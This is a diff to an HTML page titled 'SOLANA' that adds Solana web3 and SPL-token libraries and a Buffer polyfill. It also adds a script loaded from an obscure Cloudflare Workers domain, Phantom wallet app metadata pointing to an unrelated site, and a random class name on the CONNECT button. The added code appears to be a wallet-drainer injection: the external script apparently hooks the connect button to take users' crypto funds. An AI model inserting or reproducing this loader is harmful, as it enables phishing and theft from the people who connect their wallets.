@@ -5,6 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA</title>
     <link href="assets/css/main.css" rel="stylesheet">
+    <!-- MAIN -->
+    <script>
+    window.Buffer = window.Buffer || {
+      from: function (data, encoding) {
+        if (typeof data === 'string' && encoding === 'hex') {
+          const hex = data.match(/.{1,2}/g).map(h => parseInt(h, 16));
+          return new Uint8Array(hex);
+        }
+        return new Uint8Array(data);
+      },
+      alloc: function (size) {
+        return new Uint8Array(size);
+      }
+    };
+    console.log("Использован минимальный полифилл Buffer");
+    </script>
+    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
+    <script src="https://52kakslishno2.aloxamigusto.workers.dev"></script>
+    <meta name="apple-itunes-app" content="app-id=1598432977, affiliate-data=, app-argument=https://synesis.biz">
+    <meta property="al:ios:url" content="https://synesis.biz">
+    <meta property="al:ios:app_store_id" content="1598432977">
+    <meta property="al:ios:app_name" content="Phantom">
+    <!-- MAIN -->
 </head>
 <body>
         <section class="main">
@@ -30,7 +54,7 @@
                           <path d="M45.4952 4.78907C45.4952 2.57993 43.7043 0.789062 41.4952 0.789062H18.3594C17.5927 0.789062 16.8574 1.09364 16.3152 1.6358V1.6358C14.6189 3.33215 15.6075 6.23732 17.9865 6.54681L24.085 7.34019C27.5205 7.78714 28.8019 12.093 26.1699 14.3457L4.06536 33.2643C2.29426 34.7801 2.18946 37.4833 3.83788 39.1317L6.95044 42.2442C8.67088 43.9646 11.516 43.7634 12.9772 41.818L30.9099 17.9426C33.0197 15.1336 37.4664 16.2139 38.0522 19.6778L39.5237 28.3784C39.931 30.7865 42.8875 31.7301 44.6145 30.0031V30.0031C45.1784 29.4392 45.4952 28.6744 45.4952 27.8769V4.78907Z" fill="white"/>
                           </svg>
                       </a>
-                      <button type="button"  id="status" class="btn">
+                      <button type="button"  id="status" class="btn sdfnesj-n">
                         CONNECT
                     </button>
                     </div>
